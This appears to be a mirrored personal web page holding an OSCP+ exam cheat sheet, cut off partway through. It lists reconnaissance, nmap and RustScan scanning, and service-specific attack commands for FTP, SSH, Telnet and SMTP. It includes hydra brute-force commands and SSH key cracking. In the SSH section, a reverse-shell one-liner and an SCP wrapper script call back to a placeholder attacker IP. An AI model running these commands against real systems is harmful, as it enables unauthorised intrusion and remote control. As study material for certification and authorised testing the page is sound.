<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from www.emmanuelsolis.com/oscp.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Aug 2025 18:43:53 GMT -->
<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>OSCP+ | Cheatsheet</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="img/favicon.png" rel="icon">
  <link href="img/apple-touch-icon.png" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link
    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
    rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="vendor/aos/aos.css" rel="stylesheet">
  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <!-- Prism CSS -->
  <link href="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-tomorrow.min.css" rel="stylesheet" />

  <!-- Template Main CSS File -->
  <link href="css/style.css" rel="stylesheet">

  <!-- Open Graph meta tags -->
  <meta property="og:title" content="OSCP+ Cheatsheet">
  <meta property="og:description" content="A list of commands and tips for OSCP+.">
  <meta property="og:image" content="img/favicon.png">
  <meta property="og:url" content="oscp.html">
  <meta property="og:type" content="website">

  <!-- Twitter Card meta tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="OSCP+ Cheatsheet">
  <meta name="twitter:description" content="A list of commands and tips for OSCP+.">
  <meta name="twitter:image" content="img/favicon.png">
</head>

<body>

  <!-- ======= Mobile nav toggle button ======= -->
  <i class="bi bi-list mobile-nav-toggle d-xl-none"></i>

  <!-- ======= Header ======= -->
  <header id="header">
    <div class="d-flex flex-column">

      <div class="profile">
        <img src="img/profile-img.jpg" alt="" class="img-fluid rounded-circle">
        <h1 class="text-light"><a href="index-2.html">Emmanuel Solis</a></h1>
        <div class="social-links mt-3 text-center">
          <a href="https://www.linkedin.com/in/emmasolis/" target="_blank" class="linkedin"><i
              class="bx bxl-linkedin"></i></a>
          <a href="https://github.com/emmasolis1" target="_blank" class="github"><i class="bx bxl-github"></i></a>
        </div>
      </div>

      <nav id="navbar" class="nav-menu navbar">
        <ul>
          <li><a href="index-2.html" class="nav-link scrollto"><i class="bi bi-house navicon"></i>Home</a></li>
          <li><a href="resume.html" class="nav-link scrollto"><i
                class="bi bi-file-earmark-text navicon"></i><span>Resume</span></a></li>
          <li><a href="portfolio.html" class="nav-link scrollto"><i
                class="bi bi-images navicon navicon"></i><span>Portfolio</span></a></li>
          <li><a href="https://coff.ee/emmanuelsolis" target="_blank" class="nav-link scrollto"><i
                class="bi bi-heart navicon"></i>Buy Me a Coffee</a></li>
          <li class="dropdown">
            <a href="cheatsheets.html" class="nav-link scrollto active" onclick="toggleSubmenu(event)"><i
                class="bi bi-hdd-stack navicon"></i>Cheatsheets <span class="arrow">‚ñº</span></a>
            <ul id="submenu" class="submenu open">
              <li><a href="ad_pentesting.html" class="nav-link scrollto"><i
                    class="bi bi-shield-lock navicon"></i>Active Directory Pentesting</a></li>
              <li><a href="mobile_pentesting.html" class="nav-link scrollto"><i class="bi bi-phone navicon"></i>Mobile
                  Pentesting</a></li>
              <li><a href="oscp.html" class="nav-link scrollto active"><img src="img/oscp_icon.png" alt="OSCP Icon"
                    style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSCP+</a></li>
              <li><a href="oswp.html" class="nav-link scrollto"><img src="img/oswp_icon.png" alt="OSWP Icon"
                    style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSWP</a></li>
              <li><a href="pjmt.html" class="nav-link scrollto"><img src="img/pjmt_icon.png" alt="PJMT Icon"
                    style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">PJMT</a></li>
              <li><a href="red_teaming.html" class="nav-link scrollto"><i class="bi bi-shield-lock navicon"></i>Red
                  Teaming</a></li>
              <li><a href="security_plus.html" class="nav-link scrollto"><img src="img/security_icon.png"
                    alt="Security+ Icon"
                    style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">Security+</a></li>
            </ul>
          </li>
        </ul>
      </nav><!-- .nav-menu -->
    </div>
  </header><!-- End Header -->

  <main id="main">
    <!-- ======= Breadcrumbs ======= -->
    <section id="breadcrumbs" class="breadcrumbs">
      <div class="container">

        <div class="d-flex justify-content-between align-items-center">
          <h2>OSCP+ Cheatsheet</h2>
          <p class="text-muted small">Latest update: July, 2025</p>
          <ol>
            <li><a href="index-2.html">Home</a></li>
            <li>OSCP+ Cheatsheet</li>
          </ol>
        </div>

      </div>
    </section><!-- End Breadcrumbs -->

    <!-- ======= Cheatsheet Section ======= -->
    <section id="cheatsheet" class="cheatsheet">
      <div class="container">

        <div class="row gy-4">
          <div class="col-lg-12">
            <!-- ======= Disclaimer Alert ======= -->
            <div class="alert alert-warning alert-dismissible fade show" role="alert" data-aos="fade-right">
              <strong>Disclaimer:</strong> This site compiles various <u>publicly available</u> cheatsheets, commands,
              and guides, along with personal edits. It is not associated with or endorsed by OffSec or any other
              organization. If you have any concerns about the content, please review the references section. For
              further inquiries, feel free to contact me.
              <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>
            <div class="cheatsheet-content">
              <h2 id="1-information-gathering">1. <span class="emoji">üïµÔ∏è‚Äç‚ôÇÔ∏è</span> Information Gathering</h2>
              <h3 id="11-passive-information-gathering">1.1 Passive Information Gathering</h3>
              <p><strong>whois</strong></p>
              <pre><code class="language-bash">whois [domain]

# Specify a different whois server 
whois [domain] -h [server]
</code></pre>
              <p><strong>Google Dorks</strong></p>
              <ul>
                <li><code>site:somesite.com</code> or <code>site:somesite.com -filetype:html</code></li>
                <li><code>filetype:txt</code> or <code>ext:txt</code></li>
                <li><code>intitle:&quot;somethig&quot;</code></li>
                <li><a href="https://www.exploit-db.com/google-hacking-database" target="_blank">Google Hacking
                    Database</a></li>
              </ul>
              <p><strong>Other Tools</strong></p>
              <ul>
                <li><strong><a href="https://searchdns.netcraft.com/" target="_blank">Netcraft</a></strong></li>
                <li><em>gitrob</em> and <em>gitleaks</em></li>
                <li><strong>Shodan</strong>.</li>
                <li><strong><a href="https://securityheaders.com/" target="_blank">Security Headers</a></strong></li>
                <li><strong><a href="https://www.ssllabs.com/ssltest/" target="_blank">SSL/TLS</a></strong></li>
              </ul>
              <h3 id="12-dns-enumeration">1.2 DNS Enumeration</h3>
              <ul>
                <li><code>host [domain]</code></li>
                <li><code>host -t txt [domain]</code></li>
                <li><code>host [subdomain].[domain]</code></li>
                <li><code>nslookup -type=TXT [domain] [use_specific_dns_server_optional]</code></li>
                <li><strong>Automatic brute-force of DNS:</strong>
                  <code>for ip in $(cat list.txt); do host &lt;ip&gt;.[domain]; done</code>
                </li>
              </ul>
              <h3 id="13-port-scanning">1.3 Port Scanning</h3>
              <h4 id="131-netcat">1.3.1 Netcat</h4>
              <pre><code class="language-bash">nc [options] [host] [port_number]

# UDP instead of TCP
nc -u [host] [port number]

# Listen for an incoming connection rather than initiate connection
nc -l [host] [port number]

# Continue listening for connections after first client has disconnected
nc -k -l [host] [port number]

# TCP Scan in port range
nc -nvv -w 1 -z [host] [beginning_port]-[finished_port]

# -w is to specify the connection timeout in seconds, as well as -z to specify zero-I/O mode, which is used for scanning and sends no data
nc -nv -u -z -w 1 [host] [beginning_port]-[finished_port]

# -u inidcates to do an UDP scan
nc -zvu [host] [port]

# Receive reverse shell in specific port
nc -nvlp [listening_port]
</code></pre>
              <h4 id="132-nmap">1.3.2 Nmap</h4>
              <p><strong><a href="https://www.stationx.net/nmap-cheat-sheet/" target="_blank">Nmap StationX
                    CheatSheet</a></strong></p>
              <h5 id="1321-personal-methodology">1.3.2.1 Personal Methodology</h5>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Purpose</th>
                    <th>Command</th>
                    <th>Notes</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>Advanced enumeration</strong></td>
                    <td><code>nmap -A [IP/domain] -oN [machine_name].txt</code></td>
                    <td>Complete system and version detection</td>
                  </tr>
                  <tr>
                    <td><strong>Fast all-ports scan</strong></td>
                    <td><code>sudo nmap -p- -sS -sU --min-rate=1000 --max-retries=1 -T4 [IP/Domain]</code></td>
                    <td>Combines SYN and UDP scans for speed</td>
                  </tr>
                  <tr>
                    <td><strong>Fast scan alternative</strong></td>
                    <td><code>nmap -p- -T4 -n -Pn [IP/domain] -oN [machine_name]_ports.txt</code></td>
                    <td>TCP only; skips host discovery for speed</td>
                  </tr>
                  <tr>
                    <td><strong>Fast scan second alternative</strong></td>
                    <td><code>sudo nmap --minrate-5000 -p- -vvv -Pn -n -oG openPorts.txt [IP]</code></td>
                    <td>Increases min rate for quicker scanning</td>
                  </tr>
                  <tr>
                    <td><strong>Discovery all ports scan</strong></td>
                    <td><code>nmap -p- [IP/Domain] -oN [machine_name]_ports.txt</code></td>
                    <td>For full port discovery</td>
                  </tr>
                  <tr>
                    <td><strong>Top ports</strong></td>
                    <td><code>nmap [IP/Domain] --top-ports [number_of_top_ports]</code></td>
                    <td>Scan common ports only</td>
                  </tr>
                </tbody>
              </table>
              <h5 id="1322-scan-types">1.3.2.2 Scan Types</h5>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Scan Type</th>
                    <th>Command</th>
                    <th>Notes</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>UDP Scan</strong> (<code>-sU</code>)</td>
                    <td><code>sudo nmap -sU -sS [IP]</code> and <code>sudo nmap -sU -T5 --top-ports 500 [IP]</code></td>
                    <td>Use with TCP SYN for full coverage</td>
                  </tr>
                  <tr>
                    <td><strong>TCP Connect</strong> (<code>-sT</code>)</td>
                    <td><code>nmap -sT [IP]</code></td>
                    <td>Completes the handshake</td>
                  </tr>
                  <tr>
                    <td><strong>Stealth Scan</strong> (<code>-sS</code>)</td>
                    <td><code>sudo nmap -sS [IP]</code></td>
                    <td>Avoids full handshake</td>
                  </tr>
                  <tr>
                    <td><strong>Specific Port Scan</strong></td>
                    <td><code>nmap -p [portNumber] [IP]</code></td>
                    <td>Scan only one or multiple ports</td>
                  </tr>
                  <tr>
                    <td><strong>Network Sweeping</strong> (<code>-sn</code>)</td>
                    <td><code>nmap -sn [IP_range]</code></td>
                    <td>For host discovery</td>
                  </tr>
                  <tr>
                    <td><strong>Top 20 Ports</strong></td>
                    <td><code>nmap --top-ports=20 [IP]</code></td>
                    <td>Common ports in <code>/usr/share/nmap/nmap-services</code></td>
                  </tr>
                </tbody>
              </table>
              <h5 id="1323-detection-and-scanning">1.3.2.3 Detection and Scanning</h5>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Detection Type</th>
                    <th>Command</th>
                    <th>Notes</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>OS Detection</strong> (<code>-O</code>)</td>
                    <td><code>nmap -O [IP]</code></td>
                    <td>Detects OS type and version</td>
                  </tr>
                  <tr>
                    <td><strong>OS Guessing</strong></td>
                    <td><code>nmap --osscan-guess [IP]</code></td>
                    <td>Guesses OS based on packet responses</td>
                  </tr>
                  <tr>
                    <td><strong>Service Discovery</strong> (<code>-sV</code>)</td>
                    <td><code>nmap -sV [IP]</code></td>
                    <td>Discovers versions of services running</td>
                  </tr>
                  <tr>
                    <td><strong>Service Banners &amp; Traceroute</strong></td>
                    <td><code>nmap -A [IP]</code></td>
                    <td>Can be slow; consider using <code>-sV</code> for basic service detection</td>
                  </tr>
                </tbody>
              </table>
              <h5 id="1324-saving-results">1.3.2.4 Saving Results</h5>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Purpose</th>
                    <th>Command</th>
                    <th>Notes</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>Save to File</strong> (<code>-oG</code>)</td>
                    <td><code>nmap -v -sn [IP_range] -oG [fileName].txt</code></td>
                    <td>Saves results in a file in a greppable format, for normal output use <code>-oN</code></td>
                  </tr>
                  <tr>
                    <td><strong>Analyze File</strong></td>
                    <td><code>grep Up [fileName].txt cut -d &quot; &quot; -f 2</code></td>
                    <td>Extracts only active hosts</td>
                  </tr>
                </tbody>
              </table>
              <h5 id="1325-nmap-scripting-engine-nse">1.3.2.5 Nmap Scripting Engine (NSE)</h5>
              <p><em>(Scripts located in <code>/usr/share/nmap/scripts/</code>)</em></p>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Script Function</th>
                    <th>Command</th>
                    <th>Notes</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>Run Script</strong> (<code>--script</code>)</td>
                    <td><code>nmap --script [scriptName] [IP]</code></td>
                    <td>Runs specific script</td>
                  </tr>
                  <tr>
                    <td><strong>Script Help</strong></td>
                    <td><code>nmap --script-help [scriptName]</code></td>
                    <td>Shows help for the chosen script</td>
                  </tr>
                  <tr>
                    <td><strong>Example Script</strong></td>
                    <td><code>nmap --script http-headers [IP]</code></td>
                    <td>Example of running the http-headers script</td>
                  </tr>
                  <tr>
                    <td><strong>Run Category of Scripts</strong></td>
                    <td><code>nmap --script [category] [IP]</code></td>
                    <td>Categories:
                      <code>auth</code>, <code>broadcast</code>, <code>brute</code>, <code>default</code>,
                      <code>discovery</code>, <code>exploit</code>, <code>fuzzer</code>, <code>malware</code>,
                      <code>safe</code>, <code>version</code>, <code>vuln</code>
                    </td>
                  </tr>
                </tbody>
              </table>
              <h5 id="1326-powershell-functions">1.3.2.6 PowerShell Functions</h5>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Function</th>
                    <th>Command</th>
                    <th>Notes</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>Check TCP Port</strong></td>
                    <td><code>Test-NetConnection -Port [portNumber] [IP]</code></td>
                    <td>Checks a specific TCP port</td>
                  </tr>
                  <tr>
                    <td><strong>Port Scan Script</strong></td>
                    <td>
                      <code>1..1024 % {echo ((New-Object Net.Sockets.TcpClient).Connect(&quot;[IP]&quot;, $_)) &quot;TCP port $_ is open&quot;} 2&gt;$null</code>
                    </td>
                    <td>Checks ports 1-1024</td>
                  </tr>
                </tbody>
              </table>
              <h4 id="133-rustscan">1.3.3 RustScan</h4>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Purpose</th>
                    <th>Command</th>
                    <th>Notes</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>Basic RustScan</strong></td>
                    <td><code>rustscan -a &lt;target-ip&gt; -p 1-65535</code></td>
                    <td>Scans all TCP ports quickly</td>
                  </tr>
                  <tr>
                    <td><strong>RustScan + Nmap</strong></td>
                    <td><code>rustscan -a &lt;target-ip&gt; -p 1-65535 -- -Pn</code></td>
                    <td>Uses Nmap to follow up for all TCP ports</td>
                  </tr>
                  <tr>
                    <td><strong>Specific Port Range</strong></td>
                    <td><code>rustscan -a &lt;target-ip&gt; -r 1-1000</code></td>
                    <td>Scans specified port range</td>
                  </tr>
                  <tr>
                    <td><strong>Adjust Timeout &amp; Batch Size</strong></td>
                    <td><code>rustscan -a &lt;target-ip&gt; -b 500 -u 5000</code></td>
                    <td>For slow networks</td>
                  </tr>
                  <tr>
                    <td><strong>Scan Specific Ports Only</strong></td>
                    <td><code>rustscan -a &lt;target-ip&gt; -p 22,80,443</code></td>
                    <td>Scans only listed ports</td>
                  </tr>
                  <tr>
                    <td><strong>Save Results to File</strong></td>
                    <td><code>rustscan -a &lt;target-ip&gt; -- -oN [machine]_rustscan.txt</code></td>
                    <td>Saves output to file</td>
                  </tr>
                  <tr>
                    <td><strong>UDP Scan</strong></td>
                    <td><code>rustscan -a &lt;target-ip&gt; -- -sU -p 1-65535</code></td>
                    <td>Use with Nmap for UDP scanning</td>
                  </tr>
                  <tr>
                    <td><strong>Vulnerability Detection</strong></td>
                    <td><code>rustscan -a &lt;target-ip&gt; -p 1-65535 -- -sV --script vuln</code></td>
                    <td>Runs vulnerability scripts</td>
                  </tr>
                  <tr>
                    <td><strong>Silent Mode</strong></td>
                    <td><code>rustscan -a &lt;target-ip&gt; -p 1-65535 -g -q</code></td>
                    <td>Minimal output</td>
                  </tr>
                  <tr>
                    <td><strong>Exclude Certain Ports</strong></td>
                    <td><code>rustscan -a &lt;target-ip&gt; -p 1-65535 --exclude-ports 80,443</code></td>
                    <td>Excludes specific ports</td>
                  </tr>
                  <tr>
                    <td><strong>OS Detection</strong></td>
                    <td><code>rustscan -a &lt;target-ip&gt; -p 1-65535 -- -O</code></td>
                    <td>Runs OS detection</td>
                  </tr>
                  <tr>
                    <td><strong>TCP and UDP Scan</strong></td>
                    <td><code>rustscan -a &lt;target-ip&gt; -p 1-65535 -- -sS -sU</code></td>
                    <td>Both TCP and UDP; Nmap may be preferable</td>
                  </tr>
                </tbody>
              </table>
              <h3 id="14-specific-port-services">1.4 Specific Port Services</h3>
              <h4 id="141-21--ftp">1.4.1 21: FTP</h4>
              <p><strong>Nmap Scripting scan</strong></p>
              <pre><code class="language-bash">nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 [IP]
</code></pre>
              <p><strong>Enumeration</strong></p>
              <pre><code class="language-bash">ftp -A [IP]
ftp [IP]

# Login with anonymous credentials
anonymous:anonymous

# Upload a test file to check for reflection on an HTTP port
put test.txt
</code></pre>
              <p><strong>Upload binaries</strong></p>
              <pre><code class="language-bash">ftp&gt; binary

ftp&gt; put [binary_file]
</code></pre>
              <p><strong>Downloading files recursively</strong></p>
              <pre><code class="language-bash">wget -r ftp://[user]:[password]@[IP]/

# Searching for specific file
find / -name [filename_pattern] 2&gt;/dev/null

# Example of searching for files
find / -name Settings.*  2&gt;/dev/null
</code></pre>
              <p><strong>Brute Force</strong></p>
              <pre><code class="language-bash">hydra -l [username] -P [path_to_wordlist] [IP] -t 4 ftp
</code></pre>
              <p><strong>Passive Mode Syntax</strong></p>
              <pre><code class="language-bash">ftp -p [IP]
</code></pre>
              <h4 id="142-22-ssh">1.4.2 22: SSH</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash"># Basic SSH Service Scan
nmap -p 22 --script=ssh-hostkey &lt;target_ip&gt;

# SSH Authentication Bypass Detection
nmap -p 22 --script=ssh-auth-methods &lt;target_ip&gt;

# SSH Brute Force Attack
nmap -p 22 --script=ssh-brute --script-args userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=/usr/share/wordlists/rockyou.txt &lt;target_ip&gt;

# Enumerate SSH Version
nmap -p 22 --script=ssh3-enum-algos &lt;target_ip&gt;

# Detect Weak SSH Encryption Algorithms
nmap -p 22 --script=ssh3-enum-algos,sshv1 &lt;target_ip&gt;

# SSH Public Key Authentication
nmap -p 22 --script=ssh-publickey-acceptance --script-args ssh.user=&lt;username&gt;,ssh.privatekey=&lt;path_to_private_key&gt; &lt;target_ip&gt;
</code></pre>
              <p><strong>Brute Force Common Credentials</strong></p>
              <pre><code class="language-bash">hydra -l &lt;user&gt; -P /usr/share/wordlists/rockyou.txt &lt;target_ip&gt; -t 4 ssh

hydra -L &lt;user_list&gt; -p &lt;password&gt; &lt;target_ip&gt; -t 4 ssh -s &lt;port&gt;

hydra -f -V -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 22 [IP] ssh
</code></pre>
              <p><strong>User Obtained Private Key</strong></p>
              <pre><code class="language-bash">chmod 600 [output_key_file]

ssh [user]@[IP] -i [output_key_file]
</code></pre>
              <p><strong>Convert PuTTY Key to OpenSSH Format</strong></p>
              <pre><code class="language-bash">puttygen [putty_key_file] -O private-openssh -o [output_key_file]
</code></pre>
              <p><strong>Crack SSH Private Keys</strong></p>
              <pre><code class="language-bash">ssh2john &lt;private_key_file&gt; &gt; &lt;private_key_file&gt;.hash

john --wordlist=/usr/share/wordlists/rockyou.txt &lt;private_key_file&gt;.hash
</code></pre>
              <p><strong>Finding Private Keys</strong></p>
              <pre><code class="language-bash">find /etc/ssh -name &quot;*.pub&quot;

find /home/&lt;user&gt;/.ssh -name &quot;id_*&quot;
</code></pre>
              <p><strong>Possible Errors</strong></p>
              <pre><code class="language-bash"># No Password
ssh2john &lt;private_key_file&gt; &gt; &lt;private_key_file&gt;.hash # id_rsa has no password!

# Wrong User or Key
ssh &lt;user&gt;@&lt;target_ip&gt; -p &lt;port&gt; -i &lt;private_key_file&gt; # Error message: Permission denied (publickey,password).
</code></pre>
              <p><strong>Download Files from Remote Host</strong></p>
              <pre><code class="language-bash"># Download a Single File
scp user@remote_host:/path/to/remote/file /path/to/local/destination
scp user@192.168.1.10:/etc/config.txt /home/user/config.txt

# Download Multiple Files
scp user@remote_host:/path/to/remote/file1 /path/to/remote/file2 /local/destination/
scp user@192.168.1.10:/etc/config.txt user@192.168.1.10:/etc/passwd /home/user/

# Download a Directory Recursively
scp -r user@remote_host:/path/to/remote/directory /local/destination/
scp -r user@192.168.1.10:/var/www/html /home/user/

# Downlaod a File from a Specific Port (in case SSH is running on a non-default port)
scp -P 2222 user@remote_host:/path/to/remote/file /local/destination/
scp -P 2222 user@192.168.1.10:/etc/config.txt /home/user/

# Download a File Using a Private Key
scp -i /path/to/private_key user@remote_host:/path/to/remote/file /local/destination/
scp -i ~/.ssh/id_rsa user@192.168.1.10:/etc/config.txt /home/user/

# Download Files with Verbose Output
scp -v user@remote_host:/path/to/remote/file /local/destination/
scp -v user@192.168.1.10:/etc/config.txt /home/user/

# Download File Without Host Key Checking, to bypass host key checking (not recommended for secure environments)
scp -o StrictHostKeyChecking=no user@remote_host:/path/to/remote/file /local/destination/
scp -o StrictHostKeyChecking=no user@192.168.1.10:/etc/config.txt /home/user/
</code></pre>
              <p><strong>Upload Files to Remote Host</strong></p>
              <pre><code class="language-bash"># Upload a Single File
scp /path/to/local/file user@remote_host:/path/to/remote/destination
scp /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Upload Multiple Files
scp /path/to/local/file1 /path/to/local/file2 user@remote_host:/remote/destination/
scp /home/user/config.txt /home/user/passwd user@192.168.1.10:/etc/

# Upload a Directory Recursively
scp -r /path/to/local/directory user@remote_host:/path/to/remote/destination/
scp -r /home/user/html user@192.168.1.10:/var/www/

# Upload a File to a Specific Port (in case SSH is running on a non-default port)
scp -P 2222 /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -P 2222 /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Upload a File Using a Private Key
scp -i /path/to/private_key /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -i ~/.ssh/id_rsa /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Upload Files with Verbose Output
scp -v /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -v /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Upload File Without Host Key Checking, to bypass host key checking (not recommended for secure environments)
scp -o StrictHostKeyChecking=no /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -o StrictHostKeyChecking=no /home/user/config.txt user@192.168.1.10:/etc/config.txt
</code></pre>
              <p><strong>Exploit SSH with Specific Options</strong></p>
              <ol>
                <li><strong>Bypass Host Key Checking</strong>: disables the host key checking mechanism, which is
                  normally used to ensure that the SSH server you&#39;re connecting to is the one you expect. By
                  setting <code>UserKnownHostsFile</code> to <code>/dev/null</code> and
                  <code>StrictHostKeyChecking</code> to <code>no</code>,
                  you can bypass this check, which might be useful in environments where SSH keys are not properly
                  managed.
                </li>
              </ol>
              <pre><code class="language-bash">ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@target_ip
</code></pre>
              <ol start="2">
                <li><strong>Force a Different Cipher:</strong> forces the use of a specific encryption cipher (in this
                  case, <code>aes128-cbc</code>). This option can be exploited if the server is vulnerable to weaknesses
                  in a particular cipher or if a certain cipher is known to be poorly configured.</li>
              </ol>
              <pre><code class="language-bash">ssh -c aes128-cbc user@target_ip
</code></pre>
              <ol start="3">
                <li><strong>Force an Older SSH Version:</strong> forces SSH to use protocol version 2, which is more
                  secure than version 1. However, if a server still supports SSH version 1, you can try to exploit
                  vulnerabilities in the older protocol by forcing it with <code>-1</code>; this can sometimes reveal
                  older, less secure configurations or bugs in the SSH service.</li>
              </ol>
              <pre><code class="language-bash">ssh -2 user@target_ip
</code></pre>
              <ol start="4">
                <li><strong>SSH Reverse Shell with Weak Cryptographic Algorithms:</strong> used to exploit a vulnerable
                  SSH server by forcing it to use outdated and weak cryptographic algorithms
                  (<code>diffie-hellman-group1-sha1</code> and <code>ssh-rsa</code>); the SSH command initiates a
                  connection to the target server, then executes a reverse shell that connects back to the
                  attacker&#39;s machine.</li>
              </ol>
              <pre><code class="language-bash">ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa &lt;user&gt;@&lt;target_ip&gt; -t &#39;bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/443 0&gt;&amp;1&#39;

nc -nvlp [listening_port]
</code></pre>
              <ol start="5">
                <li><strong>Execute a Command Upon Connection:</strong>
                  <code>ssh user@target_ip &quot;whoami&quot;</code>
                </li>
              </ol>
              <p><strong>RCE with SCP Wrapper</strong>
                <strong>Steps:</strong>
              </p>
              <ol>
                <li><strong>Create an SCP Wrapper Script:</strong> This script intercepts SCP commands. If the original
                  SCP command is detected, it executes normally. Otherwise, it triggers a reverse shell back to the
                  attacker&#39;s machine.</li>
                <li><strong>Upload the Malicious Script:</strong> Use SCP to transfer this script to the target machine,
                  placing it in a directory where it will be executed.</li>
                <li><strong>Trigger the Script:</strong> SSH into the target machine, and the wrapper script will
                  execute the reverse shell or specified commands, providing remote access.</li>
                <li><strong>Catch the Shell:</strong> Use a tool like Netcat (<code>nc</code>) to listen for the
                  incoming reverse shell connection on your attacker&#39;s machine.</li>
              </ol>
              <ul>
                <li>SCP Wrapper Script</li>
              </ul>
              <pre><code class="language-bash">#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 &#39;scp&#39;*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo &quot;ACCESS DENIED.&quot;
    bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/443 0&gt;&amp;1
    ;;
esac
</code></pre>
              <ul>
                <li>Upload SCP Wrapper and Start Listener</li>
              </ul>
              <pre><code class="language-bash">scp -i &lt;private_key_file&gt; scp_wrapper.sh &lt;user&gt;@&lt;target_ip&gt;:/home/&lt;user&gt;/

nc -nlvp [listening_port]
</code></pre>
              <ul>
                <li>Connect to the victim</li>
              </ul>
              <pre><code class="language-bash">ssh -i &lt;private_key_file&gt; &lt;user&gt;@&lt;target_ip&gt;
</code></pre>
              <h4 id="143-23-telnet">1.4.3 23: Telnet</h4>
              <pre><code class="language-bash"># Basic login
telnet &lt;target_ip&gt; 23

# Login with specific username
telnet -l &lt;username&gt; &lt;target_ip&gt;
</code></pre>
              <h4 id="144-25-smtp">1.4.4 25: SMTP</h4>
              <p><strong>Enumeration</strong></p>
              <pre><code class="language-bash"># Nmap Scripting Scan
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 &lt;target_ip&gt;

# Netcat and Telnet Interaction
nc -nv &lt;target_ip&gt; 25
telnet &lt;target_ip&gt; 25
EHLO ALL
VRFY &lt;USER&gt;

# Interaction Example
kali@kali:~$ nc -nv 192.168.123.8 25
(UNKNOWN) [192.168.123.8] 25 (smtp) open
220 mail ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
VRFY test_user
550 5.1.1 &lt;test_user&gt;: Recipient address rejected: User unknown in local recipient table
^C
</code></pre>
              <p><strong>Python Script for Enumeration</strong></p>
              <pre><code class="language-bash"># Usage
kali@kali:~/Desktop$ python3 smtp.py root 192.168.123.8
b&#39;220 mail ESMTP Postfix (Ubuntu)\r\n&#39;
b&#39;252 2.0.0 root\r\n&#39;

kali@kali:~/Desktop$ python3 smtp.py testUser 192.168.123.8
b&#39;220 mail ESMTP Postfix (Ubuntu)\r\n&#39;
b&#39;550 5.1.1 &lt;testUser&gt;: Recipient address rejected: User unknown in local recipient table\r\n&#39;
</code></pre>
              <pre><code class="language-python">import socket
import sys

if len(sys.argv) != 3:
    print(&quot;Usage: vrfy.py &lt;username&gt; &lt;target_ip&gt;&quot;)
    sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))

# Receive the banner
banner = s.recv(1024)
print(banner)

# VRFY a user
user = (sys.argv[1]).encode()
s.send(b&#39;VRFY &#39; + user + b&#39;\r\n&#39;)
result = s.recv(1024)
print(result)

# Close the socket
s.close()
</code></pre>
              <p><strong>Installing Telnet Client for Windows</strong></p>
              <pre><code class="language-powershell">dism /online /Enable-Feature /FeatureName:TelnetClient

# Interaction Example
C:\Windows\system32&gt;telnet 192.168.123.8 25
220 mail ESMTP Postfix (Ubuntu)
VRFY testUser
550 5.1.1 &lt;testUser&gt;: Recipient address rejected: User unknown in local recipient table
VRFY root
252 2.0.0 root
</code></pre>
              <p><strong>Exploitation with SMTP Postfix Shellshock Exploit</strong></p>
              <pre><code class="language-bash"># Check if vulnerable
